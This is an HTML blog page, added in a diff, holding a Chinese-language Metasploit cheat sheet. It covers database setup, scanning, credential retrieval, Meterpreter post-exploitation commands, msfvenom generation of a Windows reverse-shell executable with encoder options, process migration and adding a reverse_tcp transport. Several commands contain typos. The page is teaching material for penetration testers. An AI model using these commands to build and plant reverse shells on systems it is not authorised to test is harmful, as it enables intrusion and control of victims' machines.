@@ -1,0 +1,131 @@
+<!DOCTYPE html>
+<html lang="zh">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="renderer" content="webkit">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+    <meta name="google-site-verification" content="TZE0rZyIqLl10trYu3BWBWa1Vmz6HFwhb2OcNEK4u-s" />
+     <link rel="shortcut icon" href= /img/clown.svg >
+    <title>
+        Clown
+    </title>
+    <meta name="description" content= IS IT JUST ME OR IS IT GETTING CRAZIER OUT THERE? >
+    <meta name="keywords" content= Blog,Hexo,Theme,Clown,ME >
+    
+<link rel="stylesheet" href="/libs/highlight/styles/monokai-sublime.css">
+
+    
+<link rel="stylesheet" href="/libs/font-awesome/css/font-awesome.min.css">
+
+    
+<link rel="stylesheet" href="/css/style.css">
+
+<meta name="generator" content="Hexo 6.3.0"></head>
+<body id="bodyx">
+    <div class="hd posts">
+    <a href="/index.html"><i class="fa fa-home
+ replay-btn" aria-hidden="true"></i></a>
+    <div class="post-title">
+        <p>
+            Metasploit指南
+        </p>
+        <hr>
+    </div>
+    <div class="post-content">
+        <p>1、Metasploit语法</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">sudo systemctl start postgresql</span><br><span class="line">sudo systemctl <span class="built_in">enable</span> postgresql</span><br><span class="line">sudo msfdb init  		//初始化数据库</span><br><span class="line">sudo apt update; sudo apt install metasploit-framework //更新msf</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">runsudo msfconsole 		//启动</span><br><span class="line">show -h					//查看模块类型</span><br><span class="line">use &lt;moduleName&gt; 		//激活模块</span><br><span class="line">show options     		//查看模块使用参数</span><br><span class="line"><span class="built_in">set</span> &lt;ArgName&gt; &lt;Data&gt;    //设置模块参数</span><br><span class="line">setg                    //设置全局参数</span><br><span class="line">run						//运行模块</span><br><span class="line">exploit	-j				//后台执行payload</span><br><span class="line"><span class="built_in">jobs</span>					//显示后台服务</span><br><span class="line"><span class="built_in">jobs</span> -i &lt;ID&gt;			//显示执行信息</span><br><span class="line">background				//后台运行</span><br><span class="line">session -l				//列出可用会话</span><br><span class="line">session -j	&lt;ID&gt;		//进入会话</span><br></pre></td></tr></table></figure>
+
+<hr>
+<p>显示服务</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">services</span><br></pre></td></tr></table></figure>
+
+<p>扫描端口并且存入数据库</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">db_nmap [--save] [--<span class="built_in">help</span>] | [--<span class="built_in">help</span> | -h] [nmap options]</span><br></pre></td></tr></table></figure>
+
+<p>显示发现的主机</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hosts</span><br></pre></td></tr></table></figure>
+
+<p>工作区间</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">workspace  //列出区间</span><br><span class="line">workspace &lt;spaceName&gt; //切换到指定区间</span><br><span class="line">workspace -A &lt;spaceName&gt; //添加区间</span><br><span class="line">workspace -D &lt;spaceName&gt; //删除工作区间</span><br></pre></td></tr></table></figure>
+
+<hr>
+<p>辅助模块</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">show auxiliary				//列出辅助模块</span><br><span class="line">search <span class="built_in">type</span>:auxiliary name:&lt;Name&gt; //搜索auxiliary中的指定Name</span><br><span class="line">use &lt;moudleNmae&gt;			//使用模块</span><br><span class="line">info 						//查看详细信息</span><br><span class="line">services -p &lt;port&gt; --rhosts //自动将结果添加到rhosts</span><br><span class="line">cerds						//从数据库中获取凭据</span><br></pre></td></tr></table></figure>
+
+<p>漏洞利用模块 大同小异 最好自己设置payloads</p>
+<hr>
+<p>Meterpreter</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">help</span>						/内置命令帮助手册</span><br><span class="line">sysinfo						/系统信息</span><br><span class="line">getuid						/获取当前用户</span><br><span class="line">upload 						/上传</span><br><span class="line">download					/下载</span><br><span class="line"><span class="built_in">pwd</span>							/获取当前所在目录路径</span><br><span class="line"><span class="built_in">cd</span>							/切换目录</span><br><span class="line"><span class="built_in">ls</span>							/列举目录文件</span><br><span class="line">shell						/启动一个shell </span><br><span class="line">execute -f &lt;processName&gt;	/启动一个程序</span><br><span class="line">ps							/列出进程列表</span><br><span class="line"><span class="built_in">kill</span>	&lt;pid&gt;				/终止进程</span><br></pre></td></tr></table></figure>
+
+<p>msfvenom</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/shell_reverse_tcp LHOST=&lt;IP&gt; LPORT&lt;PORT&gt; -f exe -o &lt;filename&gt; //生成exe文件</span><br><span class="line">-h			//显示帮助页面</span><br><span class="line">-p  		//指定paylaod</span><br><span class="line">-f			//指定文件生成格式</span><br><span class="line">-o			//指定文件输出路径</span><br><span class="line">-e			//指定编码格式</span><br><span class="line">-i			//指定编码的迭代次数</span><br><span class="line">-x			//指定一个executable文件作为模板</span><br><span class="line">-s			//指定payload载荷中的最 大长度</span><br><span class="line">-n			//为payload指定一个nopsled长度</span><br><span class="line">-b			//指定坏字符 例如<span class="string">&quot;&#x27;\x00\xff&#x27;</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure>
+
+<p>进程迁移</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">先查看进程列表 ps</span><br><span class="line">migrate &lt;PID&gt; //迁移至指定Process</span><br></pre></td></tr></table></figure>
+
+<p>其他选项</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">multi/handler 				//多处理程序模块</span><br><span class="line">show advanced   //显示其他选项</span><br><span class="line"><span class="built_in">set</span> EenableStageEncoding <span class="literal">true</span> //设置将分段的shellcode一同进行编码</span><br><span class="line"><span class="built_in">set</span> StageEncoder &lt;Encoding&gt;	  //设置编码器</span><br><span class="line">transport list				  //列出传输清单</span><br><span class="line">transport add -t reverse_tcp -l 10.11.0.4 -p 5555 //添加新的传输协议与端口</span><br><span class="line">transport next				  //创建新会话 关闭旧会话</span><br></pre></td></tr></table></figure>
+
+<hr>
+
+    </div>
+
+    
+</div>
+    <div class="footer" id="footer">
+    <p><h4>Copyright © 2020 | Author: Clown | Theme By <a class="theme-author" target="_blank" rel="noopener" href="https://github.com/Xunzhuo/hexo-theme-coder" style="font-size:14px; color: #969696">Coder</a></h4>
+    
+        <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+        <span id="busuanzi_container_site_pv">Page Views: <span id="busuanzi_value_site_pv"></span></span>
+        <span class="post-meta-divider">|</span>
+        <span id="busuanzi_container_site_uv">Unique Visitors: <span id="busuanzi_value_site_uv"></span></span>
+    
+    <label class="el-switch el-switch-blue el-switch-sm" style="vertical-align: sub;">
+        <input type="checkbox" name="switch" id="update_style">
+        <span class="el-switch-style"></span>
+    </label>
+
+    <!--         <script type="text/javascript">
+    var cnzz_protocol = (("https:" == document.location.protocol) ? "https://" : "http://");
+    document.write(unescape("%3Cspan id='cnzz_stat_icon_1278548644'%3E%3C/span%3E%3Cscript src='" + cnzz_protocol + "v1.cnzz.com/stat.php%3Fid%3D1278548644%26show%3Dpic1' type='text/javascript'%3E%3C/script%3E"));
+    </script> -->
+</p>
+</div>
+
+<input type="hidden" id="web_style" value="black">
+<input type="hidden" id="valine_appid" value="">
+<input type="hidden" id="valine_appKey" value="">
+
+<script src="/libs/jquery.min.js"></script>
+
+
+<script src="/libs/highlight/highlight.pack.js"></script>
+
+<script src='//cdn.jsdelivr.net/npm/valine@1.3.10/dist/Valine.min.js'></script>
+
+<script src="/js/js.js"></script>
+
+<style type="text/css">
+.v * {
+color: #698fca;
+}
+.v .vlist .vcard .vhead .vsys {
+color: #3a3e4a;
+}
+.v .vlist .vcard .vh .vmeta .vat {
+color: #638fd5;
+}
+.v .vlist .vcard .vhead .vnick {
+color: #6ba1ff;
+}
+.v a {
+color: #8696b1;
+}
+.v .vlist .vcard .vhead .vnick:hover {
+color: #669bfc;
+}
+</style>
+    <script type="text/javascript" color="173,174,173" opacity='1' zIndex="-2" count="99" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script>
+</body>
+</html>
